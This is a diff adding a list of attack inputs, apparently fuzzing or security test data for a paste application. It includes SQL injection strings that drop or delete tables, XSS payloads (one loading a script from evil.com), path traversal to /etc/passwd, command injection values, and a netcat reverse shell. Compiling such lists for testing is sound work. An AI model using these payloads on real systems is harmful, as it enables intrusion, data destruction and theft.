@@ -1,0 +1,53 @@
+' OR '1'='1
+" OR "1"="1
+'; DROP TABLE pastes; --
+'); DELETE FROM pastes WHERE id=';
+)); DROP TABLE pastes;
+<svg><script>alert('XSS')</script></svg>
+payload'; EXEC xp_cmdshell('dir');
+%00
+\; EXECUTENonQuery();
+' AND 1=1--
+" AND 2=2--
+</title><script>alert('Payload!');</script>
+${requestHeader.host}
+{${3*3}}
+__proto__
+constructor
+prototype
+window.alert(1)
+alert(document.cookie)
+<script src=https://evil.com/payload.js></script>
+<iframe src="https://evil.com"></iframe>
+onload=alert(1)
+javascript:alert('Payload!')
+"; DROP TABLE users; --
+'; SELECT * FROM users WHERE username = '
+< script >alert("XSS")< /script >
+../../..%2f../../..%2fetc/passwd
+\x00evil.exe
+"{$$neq: null}"
+%27 OR '1'='1%27
+A;ls -la;
+AAAAAAA... (long string of A's)
+\u0027
+' UNION SELECT * FROM table; --
+'; DROP TABLE users; --
+payload'; DELETE FROM posts WHERE id=1; --
+../etc/passwd
+../../var/log/syslog
+/proc/self/environ
+%00test
+payload\/*-*/;
+%27%5C%2F%5C%2F..%2F..%2F%2Ftmp%2Ftest
+${@exec(id)}
+{{.Name}}@{{.Image}}
+alert(1); <!--
+<svg/onload=alert(1)>
+__proto__.constructor('alert(1)')
+filename=\`whoami\`
+$(this.constructor.prototype.toString().match(/function (.*?)\(/)[1]).apply(this, arguments)
+function() { return require('fs').readFileSync('/etc/passwd'); }
+PAYLOAD=$(ls)
+payload; nc -e /bin/sh 127.0.0.1 4444
+%2E%2E%2F..%2F..%2F..%2Fetc/passwd
